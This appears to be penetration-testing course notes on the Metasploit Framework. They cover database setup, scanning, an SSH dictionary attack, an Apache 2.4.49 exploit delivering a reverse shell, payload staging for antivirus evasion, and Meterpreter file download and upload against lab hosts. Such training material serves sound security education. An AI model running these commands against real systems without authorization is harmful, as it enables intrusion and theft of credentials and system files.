# The Metasploit Framework

It should be clear that locating, working with, and fixing public exploits is difficult. They must be modified to fit each scenario and tested for malicious code. Each uses a unique command-line syntax and there is no standardization in coding practices or languages.

In addition, even in the most basic attack scenarios, there is a variety of post-exploitation tools, auxiliary tools, and attack techniques to consider.

Exploit frameworks aim to address some or all of these issues. Although they vary somewhat in form and function, each aims to consolidate and streamline the process of exploitation by offering a variety of exploits, simplifying the usage of these exploits, easing lateral movement, and assisting with the management of compromised infrastructure. Most of these frameworks offer dynamic payload capabilities. This means that for each exploit in the framework, we can choose various payloads to deploy.

### Setup and Work with MSF

While using a database is not mandatory to run Metasploit, there are various compelling reasons to do so, such as storing information about target hosts and keeping track of successful exploitation attempts. Metasploit uses PostgreSQL as a database service, which is neither active nor enabled on boot time on Kali.

We can start the database service as well as create and initialize the MSF database with msfdb init. To enable the database service at boot time we can use systemctl. Then, you can launch the Metasploit command-line interface with msfconsole, check the database status, and query for help.

```bash
sudo msfdb init
sudo systemctl enable postgresql
sudo msfconsole
> db_status
> help
```

Before we jump into performing operations within Metasploit, let's discuss one important concept first: workspaces. Let's assume we have performed a penetration test and Metasploit stored all information about our target and its infrastructure in the database. When we start the next penetration test, this information still exists in the database. To address this and avoid mixing each assessment's results with results from different assessments, we can use workspaces.

The Metasploit workspace command lists all previously-created workspaces. We can switch to a workspace by adding the name to the command. To create a new workspace, we have to provide the workspace name as argument to -a.

Let's create a workspace named pen200 where we'll store the results of this section and the next one.

```bash
> workspace # List
> workspace -a pen200 # Adds/Creates
```

Now, let's populate the database and get familiar with some of the Database Backend Commands. For this, we'll scan BRUTE2 with db_nmap which is a wrapper to execute Nmap inside Metasploit and save the findings in the database. The command has identical syntax to Nmap:

```bash
msf6 > db_nmap -A 192.168.50.202
```

To get a list of all discovered hosts up to this point, we can enter hosts. In addition, we can enter services to display the discovered services from our port scan. We can also filter for a specific port number by providing it as argument for -p.

```bash
> hosts
...
> services
> services -p 6969
```

When working on an assessment with numerous target systems, the Database Backend Commands are invaluable in identifying important information and discovering potential attack vectors. We can also use the results stored in the database as input to modules. The framework includes several thousand modules, divided into categories, which you can show:

```bash
> show -h
> use module_name
```

The modules all follow a common slash-delimited hierarchical syntax (module type/os, vendor, app, operation, or protocol/module name), which makes it easy to explore and use the modules.

### Auxiliary Modules

The Metasploit Framework includes hundreds of auxiliary modules that provide functionality such as protocol enumeration, port scanning, fuzzing, sniffing, and more. Auxiliary modules are useful for many tasks, including information gathering (under the gather/ hierarchy), scanning and enumeration of various services (under the scanner/ hierarchy), and so on.

To list all auxiliary modules, we can run the show auxiliary command. We can use search to reduce this considerable output, filtering by app, type, CVE ID, operation, platform, and more. For this first example, we want to obtain the SMB version of the previously scanned system BRUTE2 by using a Metasploit auxiliary module.

```bash
> show auxiliary
...
> search type:auxiliary smb
...
> use 56
> info
> show options
> set RHOSTS 192.168.50.202
> show missing
> unset RHOSTS
```

Instead of setting the value manually, we can also set the value of RHOSTS in an automated fashion by leveraging the results in the database. For example, we can set RHOSTS to all discovered hosts with open port 445 by entering services, the port number as argument to -p, and --rhosts to set the results for this option.

```bash
> services -p 445 --rhosts
> run
> vulns # See if Metasploit automatically detected vulns based on the results
```

Next, let's use another module. In the Password Attacks Module, we successfully identified credentials on BRUTE by leveraging a dictionary attack against SSH. Instead of Hydra, we can also use Metasploit to perform this attack. To begin, we'll search for SSH auxiliary modules.

```bash
> search type:auxiliary ssh
> use 15
> show options
> set PASS_FILE /usr/share/wordlists/rockyou.txt
> set USERNAME george
> set RHOSTS 192.168.50.201
> set RPORT 2222
> run
> creds # See if Metasploit found any valid credentials
```

### Exploit Modules

Exploit modules most commonly contain exploit code for vulnerable applications and services. Metasploit contains over 2200 exploits at the time of this writing. Each was meticulously developed and tested, making MSF capable of successfully exploiting a wide variety of vulnerable services. These exploits are invoked in much the same way as auxiliary modules.


```bash
> workspace -a exploits
> search Apache 2.4.49
> use 0
> info
```

Check supported determines if we can use the check command to dry-run the exploit module and confirm if a target is vulnerable before we actually attempt to exploit it.

```bash
> show options
> set payload payload/linux/x64/shell_reverse_tcp
> set LHOST 192.168.45.175
```

In real penetration tests we may face the situation that port 4444 is blocked by firewalls or other security technologies. This is quite common as it is the default port for Metasploit's modules. In situations like this, changing the port number to ports associated with more commonly used protocols such as HTTP or HTTPS may lead to a successful execution of the selected payload.

We should note that we don't need to start a listener manually with tools such as Netcat to receive the incoming reverse shell. Metasploit automatically sets up a listener matching the specified payload.

Now, let's set the options SSL to false and RPORT to 80 since the target Apache web server runs on port 80 without HTTPS. Then, we set RHOSTS to the target IP and enter run.

```bash
> set SSL false
> set RPORT 80
> set RHOSTS 192.168.50.16
> run
```

Before we head to the next section, let's explore the concept of sessions and jobs in Metasploit. Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.

When we launched the exploit with run, a session was created and we obtained an interactive shell. We can send the session to the background by pressing Ctrl+z and confirming the prompt. Once the session is sent to the background, we can use sessions -l to list all active sessions.

```bash
^Z
Background session 2? [y/N]  y

msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -l

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  ...
  2         shell x64/linux               192.168.119.4:4444 -> 192.168.50.16:35534 (192.168.50.16)

msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2
[*] Starting interaction with 2...

uname -a
Linux c1dbace7bab7 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

We can kill a session with sessions -k and the ID as argument.

Instead of launching an exploit module and sending the resulting session to the background, we can use run -j to launch it in the context of a job. This way, we'll still find the output of launching the exploit module, but we'll need to interact with the resulting session before we can access it.

In an assessment, we'll face numerous targets and it is very easy to lose track of machines we already have access to. Using an exploit framework like Metasploit helps us manage access to these machines.

If we want to execute commands on a specific system, we don't have to search through various terminals to find the correct Netcat listener, we can just interact with the specific session. We can launch exploit modules with run -j in the background and Metasploit will automatically create a session for us while we already work on the next target.

In addition, Metasploit also stores information about targets, module results, and vulnerabilities in the database, which are invaluable for further steps in a penetration test and writing the report for the client.

### Staged vs Non-Staged Payloads

We need to be aware of the buffer size our shellcode will be stored in. If the shellcode size of our exploit exceeds the buffer size, our exploit attempt will fail. In a situation like this, it's vital which payload type we choose: staged or non-staged.

A non-staged payload is sent in its entirety along with the exploit. This means the payload contains the exploit and full shellcode for a selected task. In general, these "all-in-one" payloads are more stable. The downside is that the size of these payloads will be bigger than other types.

In contrast, a staged payload is usually sent in two parts. The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

There are several situations in which we would prefer to use a staged payload instead of non-staged. If there are space-limitations in an exploit, a staged payload might be a better choice as it is typically smaller. In addition, we need to keep in mind that antivirus software can detect shellcode in an exploit. By replacing the full code with a first stage, which loads the second and malicious part of the shellcode, the remaining payload is retrieved and injected directly into the victim machine's memory. This may prevent detection and can increase our chances of success.

```bash
> show payloads
> set payload 15
> run
```

To search for a staged 32 bit tcp reverse shell:

```bash
show payloads "staged tcp command"
```

### Meterpreter Payload

In the previous sections, we used a common TCP reverse shell. While we do have interactive access on a target system with this type of payload, we only have the functionality of a regular command shell. Exploit frameworks often contain more advanced payloads providing features and functionality such as file transfers, pivoting, and various other methods of interacting with the victim machine.

Metasploit contains the Meterpreter1 payload, which is a multi-function payload that can be dynamically extended at run-time. The payload resides entirely in memory on the target and its communication is encrypted by default. Meterpreter offers capabilities that are especially useful in the post-exploitation phase and exists for various operating systems such as Windows, Linux, macOS, Android, and more. "payload/linux/x64/meterpreter_reverse_tcp" is a classic.

At this point, we should note that all Meterpreter payloads are staged. However, the output of show payloads contains staged and non-staged payloads. The difference between those two types is how the Meterpreter payload is transferred to the target machine. The non-staged version includes all components required to launch a Meterpreter session while the staged version uses a separate first stage to load these components.2 Loading these components over the network creates quite some traffic and may alert defensive mechanisms. In situations where our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, a non-staged Meterpreter payload comes in quite handy.3 For the rest of the Module, we'll use the non-staged version whenever we use a Meterpreter payload.

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > run
meterpreter > help
meterpreter > sysinfo
meterpreter > getuid
```

As we've already learned, Metasploit uses sessions to manage access to different machines. When Metasploit interacts with a system within a session, it uses a concept named channels. Let's start an interactive shell by entering shell, execute a command in the context of a channel, and background the channel the shell runs in. To background a channel, we can use Ctrl+z.

```bash
meterpreter > shell
Process 196 created.
Channel 2 created.
whoami
daemon
^Z
Background channel 2? [y/N]  y
```

```bash
meterpreter > channel -l

    Id  Class  Type
    --  -----  ----
    1   3      stdapi_process
    2   3      stdapi_process

meterpreter > channel -i 1
Interacting with channel 1...

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Next, let's use the download and upload commands from the category File system Commands to transfer files to and from the system. For this, let's review the commands of this category first.

```bash
meterpreter > lpwd
/home/kali

meterpreter > lcd /home/kali/Downloads

meterpreter > lpwd
/home/kali/Downloads

meterpreter > download /etc/passwd
[*] Downloading: /etc/passwd -> /home/kali/Downloads/passwd
[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd -> /home/kali/Downloads/passwd
[*] download   : /etc/passwd -> /home/kali/Downloads/passwd

meterpreter > lcat /home/kali/Downloads/passwd
root:x:0:0:root:/root:/bin/bash
...
```

```bash
meterpreter > upload /usr/bin/unix-privesc-check /tmp/
[*] uploading  : /usr/bin/unix-privesc-check -> /tmp/
[*] uploaded   : /usr/bin/unix-privesc-check -> /tmp//unix-privesc-check

meterpreter > ls /tmp
Listing: /tmp
=============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
...
100644/rw-r--r--  36801    fil   2022-08-08 05:26:15 -0400  unix-privesc-check
```